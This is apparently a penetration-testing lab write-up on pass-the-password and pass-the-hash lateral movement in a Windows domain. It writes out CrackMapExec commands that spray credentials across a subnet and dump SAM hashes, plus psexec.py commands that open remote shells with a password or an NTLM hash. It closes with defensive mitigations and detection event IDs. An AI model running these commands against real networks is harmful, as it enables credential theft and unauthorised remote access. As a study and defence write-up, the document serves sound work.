# Pass-the-Hash / Pass-the-Password using Crackmapexec

**MITRE ATT&CK:** T1550.002 (Use of Alternate Authentication Material: Pass-the-Hash)

---

## 1. Objective

Demonstrate lateral movement using valid credentials and NTLM hashes to authenticate to additional systems within the domain without knowing plaintext passwords.

This phase validates credential reuse and privilege spread across the network.

---

## 2. Technical Background

### Pass-the-Password

Uses:

* Valid username
* Plaintext password

To authenticate to additional systems.

---

### Pass-the-Hash (PtH)

Uses:

* NTLM hash (instead of plaintext password)
* No cracking required

Windows authentication accepts NTLM hashes directly during SMB authentication, making hash reuse possible.

---

## 3. Tool Used

Primary tool:

```id="a82kd7"
CrackMapExec
```

Used for:

* Credential validation
* Network-wide authentication attempts
* SAM dumping
* Lateral movement discovery

Secondary tool:

```id="b71sl3"
psexec.py
```

From Impacket — used to spawn remote shells after authentication is validated.

---

# 4. Pass-the-Password

---

## Step 1 — Validate Credentials Across Network

```bash id="j9xla3"
crackmapexec smb <CIDR_range> -u <username> -d <domain> -p <password>
```

Example:

```bash
crackmapexec smb 192.168.177.0/24 -u dadam -d SPECTRA -p Password1
```

## Step 2 — Dump SAM (Optional)

```bash id="o8m29s"
crackmapexec smb <CIDR> -u <username> -d <domain> -p <password> --sam
```

This extracts:

* Local account NTLM hashes
* Administrator hashes
* Machine account hashes


📸 Screenshot:

* `screenshots/pass/01-pass-pwd-no-sam-dump.png`
* `screenshots/pass/02-pass-pwd-with-sam-dump.png`

---

## Interpreting Results

Output may show:

* Target IP
* Hostname
* OS version
* Authentication result

If successful:

```id="pz3kl0"
[+] Authentication successful
```

In older CME versions, you may see:

```id="x2k7q1"
Pwn3d!
```

This indicates:

* The credential is valid
* The account likely has administrative access

---

## Step 3 — Gain Shell with psexec.py

Once authentication is confirmed:

```bash id="e0lq1v"
psexec.py SPECTRA/dadam:Password1@192.168.177.129
```

📸 Screenshot:

* `screenshots/pass/03-gain-shell-with-pwd-using-psexec-on-first-ip.png`
* `screenshots/pass/04-gain-shell-with-pwd-using-psexec-on-second-ip.png`

Result:

* Remote shell established
* Lateral movement achieved

Previously only one machine was compromised — now multiple hosts are accessible.

---

# 5. Pass-the-Hash

If plaintext password is unavailable or cannot be cracked:

Use NTLM hash directly.

---

## Step 1 — Extract NTLM Hash

Example hash format:

```id="v71kfs"
aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b
```

Format:

```
LMHASH:NTHASH
```

Modern Windows typically uses:

* Blank LM hash
* Active NTLM hash

---

## Step 2 — Validate Hash Across Network

```bash id="x1slp8"
crackmapexec smb <CIDR> -u <username> -d <domain> -H <NTLM_hash>
```

Example:

```bash
crackmapexec smb 192.168.177.0/24 -u dadam -d SPECTRA.local -H 64f12cddaa88057e06a81b54e73b949b
```

If successful:

* Output shows `[+]`
* Indicates likely administrative access

📸 Screenshot:

* `screenshots/pass/05-pass-hash-with-no-sam-dump.png`
* `screenshots/pass/06-pass-hash-with-sam-dump.png`
* `screenshots/pass/07a-pass-hash-with-only-NT-hash-no-sam-dump.png`
* `screenshots/pass/07b-pass-hash-with-only-NT-hash-with-sam-dump.png`

---

## Step 3 — Remote Execution with Hash

Using full LM:NTLM format:

```bash id="t6sk4y"
psexec.py SPECTRA/dradam@192.168.177.129 -hashes aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b
```

📸 Screenshot:

* `screenshots/pass/08-gain-shell-with-hash-using-psexec-on-first-ip.png`
* `screenshots/pass/09-gain-shell-with-hash-using-psexec-on-second-ip.png`

If authentication fails:

* The hash is valid for authentication but lacks admin rights
* Or SMB signing / firewall blocks execution
* Or user is not local admin

---

## 6. Key Observations

* Credential reuse significantly increases risk
* Local admin reuse enables rapid lateral movement
* Even standard users may have admin rights on other systems
* Hash cracking is not required for lateral movement

This demonstrates why NTLM-based environments are high-risk when passwords are reused.

---

## 7. Business Impact

Successful Pass-the-Hash enables:

* Rapid lateral movement
* Expansion of attack surface
* Privilege escalation
* Domain takeover
* Ransomware propagation

This technique is widely used in real-world breaches.

---

## 8. Defensive Mitigation

### 1️⃣ Limit Credential Reuse

* Unique local admin passwords per machine
* Disable default Administrator account
* Remove unnecessary local admin assignments

---

### 2️⃣ Implement LAPS / Windows LAPS

* Automatically rotate local admin passwords
* Prevent hash reuse across machines

---

### 3️⃣ Privileged Access Management (PAM)

* Just-in-time admin access
* Password rotation
* Session monitoring

---

### 4️⃣ Disable or Restrict NTLM

* Enforce Kerberos where possible
* Enable SMB signing
* Enable Extended Protection for Authentication

---

### 5️⃣ Monitor Lateral Movement

Look for:

* Event ID 4624 (Logon Type 3)
* Event ID 4672 (Special privileges assigned)
* Suspicious SMB authentication bursts

---

## 9. Skills Demonstrated

* Lateral movement strategy
* NTLM authentication mechanics
* Hash vs plaintext authentication
* CrackMapExec operational use
* Impacket remote execution
* Enterprise risk analysis
* Defensive mapping

---
